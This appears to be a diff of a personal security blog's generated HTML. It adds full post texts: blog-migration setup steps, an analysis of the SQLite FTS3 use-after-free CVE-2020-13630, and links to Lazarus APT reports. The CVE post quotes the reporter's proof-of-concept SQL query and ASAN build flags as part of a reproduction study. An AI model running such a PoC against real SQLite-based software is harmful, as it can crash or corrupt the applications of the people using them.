         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-
-              
-                
               
 
               <time title="Created: 2020-11-18 21:20:00 / Modified: 21:50:53" itemprop="dateCreated datePublished" datetime="2020-11-18T21:20:00+08:00">2020-11-18</time>
             </span>
-          
-            
-
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/博客搭建/" itemprop="url" rel="index"><span itemprop="name">博客搭建</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">博客搭建</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/11/18/blog迁移小记/" class="post-meta-item leancloud_visitors" data-flag-title="blog迁移小记" title="Views">
+            <span id="/2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/" class="post-meta-item leancloud_visitors" data-flag-title="blog迁移小记" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/11/18/blog迁移小记/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/11/18/blog迁移小记/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -463,16 +438,26 @@
 
       
           <p>由于换了新电脑，准备把原来的博客迁移到新电脑上，记录一下大致流程，具体的也可到网上找文章，前辈们早就走过的路了。</p>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/11/18/blog迁移小记/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<p>1、首先把原来电脑上的blog文件夹全部复制过来。</p>
+<p>2、在新电脑上安装Git、Node.js, 安装完Node.js 后安装hexo。</p>
+<p><code>npm i hexo </code></p>
+<p>下得太慢了，换了个淘宝的镜像。</p>
+<p><code>npm config set registry https://registry.npm.taobao.org</code></p>
+<p><code>npm info underscore</code> 查看信息。</p>
+<p>3、然后尝试<code>hexo g -d</code>发现报错了，可能是原来的node模块版本和现在的node版本不兼容，重新安装一下一些包：</p>
+<p><code>npm i hexo-server,hexo-deployer-git --save</code></p>
+<p>4、再次尝试，发现ssh私钥的问题不对，啊全忘了。</p>
+<p>GitBash生成ssh key：<code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code></p>
+<p>检查是否可以：<code>ssh -v git@github.com</code></p>
+<p>添加id_rsa:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br><span class="line">ssh-add ~&#x2F;.ssh&#x2F;id_rsa	</span><br></pre></td></tr></table></figure>
+
+<p>将id_rsa同目录下的id_rsa.pub内容复制添加到GitHub上的设置里去：</p>
+<p><img src="/2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/image-20201118214926296.png" alt="image-20201118214926296"></p>
+<p>验证：</p>
+<p><code>ssh -T git@github.com</code>, 成功！</p>
+<p>又可以继续愉快地写博客了。</p>
+
       
     </div>
 
@@ -480,89 +465,73 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/10/CVE-2020-13630分析/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/11/10/CVE-2020-13630分析/" class="post-title-link" itemprop="url">CVE-2020-13630分析</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2020-13630分析</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-
-              
-                
               
 
               <time title="Created: 2020-11-10 09:25:11 / Modified: 09:43:43" itemprop="dateCreated datePublished" datetime="2020-11-10T09:25:11+08:00">2020-11-10</time>
             </span>
-          
-            
-
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞挖掘/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/11/10/CVE-2020-13630分析/" class="post-meta-item leancloud_visitors" data-flag-title="CVE-2020-13630分析" title="Views">
+            <span id="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/" class="post-meta-item leancloud_visitors" data-flag-title="CVE-2020-13630分析" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/11/10/CVE-2020-13630分析/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/11/10/CVE-2020-13630分析/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -579,16 +548,86 @@
           <h1 id="CVE-2020-13630分析文档"><a href="#CVE-2020-13630分析文档" class="headerlink" title="CVE-2020-13630分析文档"></a>CVE-2020-13630分析文档</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><ul>
 <li>在sqlite3的fts3扩展中，fts3EvalNextRow中存在一个Use-After-Free漏洞，与Snippet函数有关。</li>
 </ul>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/11/10/CVE-2020-13630分析/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<p>fts3扩展是sqlite为了支持快速全文查询而加入的一个扩展，其官方文档里面列出了使用常规查询方法和fts查询方法的耗时对比，如下图：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031032907904.png" alt="image-20201031032907904"></p>
+<p>而Snippet函数是用来支持fts3扩展全文查询的一个辅助函数，返回的是用<code>MATCH</code>关键字匹配的内容的代码片段(ftsSegment)，另外还有两个类似的函数<code>offsets,matchinfo</code>,这三个辅助函数只在使用FTS表的全文索引的SELECT语句中有用。如果在使用“rowid查询”或“线性扫描”策略的SELECT中使用，那么代码段和偏移量都返回一个空字符串，而matchinfo函数返回一个blob值，大小为零字节。所以使用Snippet函数的一个例子可以这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create virtual table t0 use fts3();</span><br><span class="line">insert into t0 values (&quot;abcd&quot;);</span><br><span class="line">select snippet(t0) from t0 where t0 MATCH &#39;cd&#39;;		</span><br></pre></td></tr></table></figure>
+
+<p>而在漏洞发现者给出的poc中也看到了相似的查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS t0_content;</span><br><span class="line">DROP TABLE IF EXISTS t0_messageize;</span><br><span class="line">DROP TABLE IF EXISTS t0_segdir;</span><br><span class="line">DROP TABLE IF EXISTS t0_segments;</span><br><span class="line">DROP TABLE IF EXISTS t0_stat;</span><br><span class="line">DROP TABLE IF EXISTS t0;</span><br><span class="line">CREATE VIRTUAL TABLE t0 USING fts3(col0 INTEGER PRIMARY KEY,col1 VARCHAR(8),col2 BINARY,col3 BINARY);</span><br><span class="line">INSERT INTO t0 VALUES (1, &#39;1234&#39;,&#39;aaaa&#39;,&#39;bbbb&#39;);</span><br><span class="line">SELECT snippet(t0 )  FROM t0 WHERE t0 MATCH x&#39;0a4d4d4d4d320a4f52d70a310a310a4e4541520a0a31f6ce0a4f520a0a310a310a310a4f520a75fc2a242424&#39; ;</span><br></pre></td></tr></table></figure>
+
+<p>POC中16进制匹配的值的ASCII表示如下（将换行符0x0a替换成了空格0x20）：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031034434034.png" alt="image-20201031034434034"></p>
+<p>这里虽然不知道是怎么个原理。但漏洞触发的调用过程可以分析如下：</p>
+<p>在执行具有snippet函数的fts全文查询的时候，会调用<code>sqlite3Fts3SegReaderNew</code>函数来为将要匹配到的内容分配一个空间来存储，这个对象叫做<code>Fts3SegReader</code>:</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031074958842.png" alt="image-20201031074958842"></p>
+<p>然后sqlite会调用<code>fts3BestSnippet</code>来寻找最合适匹配的Snippet片段，在<code>fts3BestSnippet</code>调用了<code>fts3SnippetFindPositions</code>，然后又调用了<code>sqlite3Fts3EvalPhrasePoslist</code>来寻找具体的位置，在<code>sqlite3Fts3EvalPhrasePoslist</code>中就调用了漏洞函数<code>fts3EvalNextRow</code>:</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031080108462.png" alt="image-20201031080108462"></p>
+<p>fts3EvalNextRow中会根据传入参数的Fts3Expr.eType（pNear）来进行不同的处理，在处理eType为FTSQUERY_AND的时候，如果当前pNear的左右子节点都被推迟解析了（通过bDeferred判断）的话，则会判断当前是否已经到了结束的地方（bEof），如果当前节点的左右子节点有一个结束且当前节点为FTSQOERY_NEAR的话，则将其左右子节点的文档列表（doclist）内容置为0，这代表了这里就是结束的地方了，所以应该确保其左右子节点的bEof都置为1了，但是在SQLite的版本（0d69f76f0865f962）之前，没有做此处理，这就引发了后续的UAF漏洞：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031082052006.png" alt="image-20201031082052006"></p>
+<p>查找到匹配的内容后就会调用<code>fts3SegReaderCursorFree</code>Free掉之前分配的<code>Fts3SegReader</code>对象。上面的搜寻过程会将近似匹配片段存到一个SnippetIter中，之后需要从这一个候选的片段中找到一个最佳的，会调用<code>fts3SnippetNextCandidate</code>进行迭代，在该函数里面会调用<code>fts3SnippetAdvance</code>继续遍历下一个Snippet：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031085050339.png" alt="image-20201031085050339"></p>
+<p>然后在之前可能没有正确设置结束的地方的时候，fts3SnippetAdvance遍历会出现访问之前已经释放的地址的内容的情况，造成UAF漏洞：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031090735722.png" alt="image-20201031090735722"></p>
+<h2 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h2><p>编译的SQLite版本：3.31.1</p>
+<p>configure命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCC+=<span class="string">&quot;-DSQLITE_ENABLE_VFSTRACE -DSQLITE_ENABLE_STAT3 -DSQLITE_ENABLE_FTS4 -DSQLITE_ENABLE_FTS3 -DSQLITE_ENABLE_BATCH_ATOMIC_WRITE -DHAVE_READLINE -DSQLITE_ENABLE_FTS3_PARENTHESIS -DTHREADSAFE=0 -DSQLITE_ENABLE_DESERIALIZE -DSQLITE_ENABLE_DBSTAT_VTAB&quot;</span>  ../SQLite-3bfa9cc9/configure</span><br></pre></td></tr></table></figure>
+
+<p>修改Makefile加上ASAN参数：<code>-fsanitize=address -fno-omit-frame-pointer</code></p>
+<p>根据上面描述的，在sqlite3.c:176720（Malloc的地方）, sqlite3:178133（Free的地方）, sqlite3:181223（Use again的地方）处下断点，执行poc进行调试：</p>
+<h3 id="1-Malloc"><a href="#1-Malloc" class="headerlink" title="1. Malloc"></a>1. Malloc</h3><p>首先会在Malloc处申请多个Fts3SegReader,每个大小为0x180:</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031124107520.png" alt="image-20201031124107520"></p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031124255316.png" alt="image-20201031124255316"></p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031124423282.png" alt="image-20201031124423282"></p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031125125861.png" alt="image-20201031125125861"></p>
+<p>一共有9个Fts3SegReader.</p>
+<h3 id="2-Free"><a href="#2-Free" class="headerlink" title="2. Free"></a>2. Free</h3><p>分配，进行匹配完之后，一开始会Free掉最后分配的Fts3SegReader对象，然后把匹配到的值打印出来，最后再Free掉剩下的Fts3SegReader对象：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031125414512.png" alt="image-20201031125414512"></p>
+<h3 id="3-Use"><a href="#3-Use" class="headerlink" title="3. Use"></a>3. Use</h3><p>93ce是之前分配的Fts3SegReader里面的内容，属于0x6120000094c0这个对象里的内容：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031125830659.png" alt="image-20201031125830659"></p>
+<p>查看该对象的内容：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031140547018.png" alt="image-20201031140547018"></p>
+<p>而这一部分属于Fts3SegReader的aDoclist。然后继续执行，发现这个地方的内容在不同的Fts3SegReader对象中的内容都一样：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031134531348.png" alt="image-20201031134531348"></p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031134551909.png" alt="image-20201031134551909"></p>
+<p>都是<code>“\001\003\004\003\006\003\003”</code>。</p>
+<p>继续执行，返回匹配到的值：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031140233123.png" alt="image-20201031140233123"></p>
+<p>最后Free剩下的Fts3SegReader：</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031140952530.png" alt="image-20201031140952530"></p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031141100982.png" alt="image-20201031141100982"></p>
+<p>一直执行，没有发现ASAN检测出的错误。</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031141323083.png" alt="image-20201031141323083"></p>
+<h2 id="确认的问题："><a href="#确认的问题：" class="headerlink" title="确认的问题："></a>确认的问题：</h2><h3 id="1-Chrome是否有独立的sqlite3文件？"><a href="#1-Chrome是否有独立的sqlite3文件？" class="headerlink" title="1. Chrome是否有独立的sqlite3文件？"></a>1. Chrome是否有独立的sqlite3文件？</h3><p>单从安装在Windows上的Chrome版本来说，其安装目录下并没有独立的sqlite3的独立文件，甚至连和有关sqlite3的相关文件都没有。</p>
+<h3 id="2-FTS3扩展自行创建的信息表内容："><a href="#2-FTS3扩展自行创建的信息表内容：" class="headerlink" title="2. FTS3扩展自行创建的信息表内容："></a>2. FTS3扩展自行创建的信息表内容：</h3><p>这些表叫做“shadow table”，是真实的表，用于存储底层数据。</p>
+<ul>
+<li><strong>t0_content</strong>: 会根据创建的虚表的创建而声明，就是虚表的内容。</li>
+</ul>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031142923543.png" alt="image-20201031142923543"></p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031142949495.png" alt="image-20201031142949495"></p>
+<ul>
+<li><strong>t0_segdir, t0_segments</strong>: 这两张表是用于存储全文索引的。从概念上讲，这个索引是一个查找表，它将每个词（word）映射到一组docid值，这些docid值对应于% content表中包含一个或多个词的记录。为了检索包含指定术语的所有文档，FTS模块查询该索引以确定包含该术语的记录的docid值集，然后从% content表检索所需的文档。</li>
+</ul>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031143457857.png" alt="image-20201031143457857"></p>
+<ul>
+<li><strong>t0_stat, t0_docsize</strong>: 这两个表是使用FTS4创建虚表的时候才创建的表。</li>
+</ul>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031143942190.png" alt="image-20201031143942190"></p>
+<ul>
+<li><strong>t0_messageize</strong>: 这个表也是没有查到，而且官方文档里面并没有说有这个表。</li>
+</ul>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031144057813.png" alt="image-20201031144057813"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>整个PoC的调用流程弄清楚了，但是具体的PoC里的那段MATCH的值所代表的的内容是不清楚的，我把那部分加入到PoC中的INSERT语句中才会走到Use（sqlite3.c:178133）的地方。如果是原始的PoC的话，则不会走到这个地方。编译的时候也测试了sqlite3是加入了ASAN编译选项的，但实际执行PoC后确实没有反应。</p>
+<p>参考链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1080459#c5">https://bugs.chromium.org/p/chromium/issues/detail?id=1080459#c5</a>   漏洞报告者和Chrome开发者的讨论记录</li>
+<li><a target="_blank" rel="noopener" href="https://www.sqlite.org/fts3.html#introduction_to_fts3_and_fts4">https://www.sqlite.org/fts3.html#introduction_to_fts3_and_fts4</a>   sqlite的FTS3和FTS4的官方介绍文档</li>
+<li><a target="_blank" rel="noopener" href="https://sqlite.org/src/info/0d69f76f0865f962">https://sqlite.org/src/info/0d69f76f0865f962</a>            Patch的记录</li>
+<li><a target="_blank" rel="noopener" href="https://sqlite.org/forum/timeline?advm=0&amp;b=2020-10-21+01:58:20&amp;n=50&amp;nsm&amp;ss=v&amp;vfx&amp;y=f">https://sqlite.org/forum/timeline?advm=0&amp;b=2020-10-21+01:58:20&amp;n=50&amp;nsm&amp;ss=v&amp;vfx&amp;y=f</a>    SQLiteForm的timeline</li>
+</ul>
+<p>注：特意输错命令，sqlite3检测到memory leak错误。</p>
+<p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031145922259.png" alt="image-20201031145922259"></p>
+
       
     </div>
 
@@ -596,89 +635,73 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/Lazarus-APT的一些报告链接/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/Lazarus-APT%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E5%91%8A%E9%93%BE%E6%8E%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/11/09/Lazarus-APT的一些报告链接/" class="post-title-link" itemprop="url">Lazarus APT的一些报告链接</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/11/09/Lazarus-APT%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E5%91%8A%E9%93%BE%E6%8E%A5/" class="post-title-link" itemprop="url">Lazarus APT的一些报告链接</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-
-              
-                
               
 
               <time title="Created: 2020-11-09 18:56:57 / Modified: 18:59:57" itemprop="dateCreated datePublished" datetime="2020-11-09T18:56:57+08:00">2020-11-09</time>
             </span>
-          
-            
-
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Thought/" itemprop="url" rel="index"><span itemprop="name">Thought</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Thought/" itemprop="url" rel="index"><span itemprop="name">Thought</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/11/09/Lazarus-APT的一些报告链接/" class="post-meta-item leancloud_visitors" data-flag-title="Lazarus APT的一些报告链接" title="Views">
+            <span id="/2020/11/09/Lazarus-APT%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E5%91%8A%E9%93%BE%E6%8E%A5/" class="post-meta-item leancloud_visitors" data-flag-title="Lazarus APT的一些报告链接" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/11/09/Lazarus-APT的一些报告链接/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/Lazarus-APT的一些报告链接/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/11/09/Lazarus-APT%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E5%91%8A%E9%93%BE%E6%8E%A5/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/Lazarus-APT%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E5%91%8A%E9%93%BE%E6%8E%A5/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -692,9 +715,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><a href="https://paper.seebug.org/1279/" target="_blank" rel="noopener">https://paper.seebug.org/1279/</a>      卡巴斯基报告：Lazarus APT 组织的大型狩猎游戏<br><a href="https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/" target="_blank" rel="noopener">https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/</a>  MATA卡巴斯基报告<br><a href="https://www.freebuf.com/sectool/244849.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/244849.html</a>   上一条的翻译版本<br><a href="https://securelist.com/apt-trends-report-q2-2020/97937/" target="_blank" rel="noopener">https://securelist.com/apt-trends-report-q2-2020/97937/</a>  卡巴斯基2020第二季度APT趋势报告<br><a href="https://us-cert.cisa.gov/ncas/analysis-reports/AR19-129A" target="_blank" rel="noopener">https://us-cert.cisa.gov/ncas/analysis-reports/AR19-129A</a>      ELECTRICFISH工具分析报告（较新）<br><a href="https://www.anquanke.com/post/id/190189" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190189</a>      2019-11-04一个样本分析报告</p>
+          <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1279/">https://paper.seebug.org/1279/</a>      卡巴斯基报告：Lazarus APT 组织的大型狩猎游戏<br><a target="_blank" rel="noopener" href="https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/">https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/</a>  MATA卡巴斯基报告<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/244849.html">https://www.freebuf.com/sectool/244849.html</a>   上一条的翻译版本<br><a target="_blank" rel="noopener" href="https://securelist.com/apt-trends-report-q2-2020/97937/">https://securelist.com/apt-trends-report-q2-2020/97937/</a>  卡巴斯基2020第二季度APT趋势报告<br><a target="_blank" rel="noopener" href="https://us-cert.cisa.gov/ncas/analysis-reports/AR19-129A">https://us-cert.cisa.gov/ncas/analysis-reports/AR19-129A</a>      ELECTRICFISH工具分析报告（较新）<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190189">https://www.anquanke.com/post/id/190189</a>      2019-11-04一个样本分析报告</p>
 
-        
       
     </div>
 
@@ -702,97 +724,79 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/BGP协议的几个CVE漏洞简述/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/BGP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%A0%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/11/09/BGP协议的几个CVE漏洞简述/" class="post-title-link" itemprop="url">BGP协议的几个CVE漏洞简述</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/11/09/BGP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%A0%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/" class="post-title-link" itemprop="url">BGP协议的几个CVE漏洞简述</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2020-11-09 18:55:17" itemprop="dateCreated datePublished" datetime="2020-11-09T18:55:17+08:00">2020-11-09</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-11-18 20:50:36" itemprop="dateModified" datetime="2020-11-18T20:50:36+08:00">2020-11-18</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
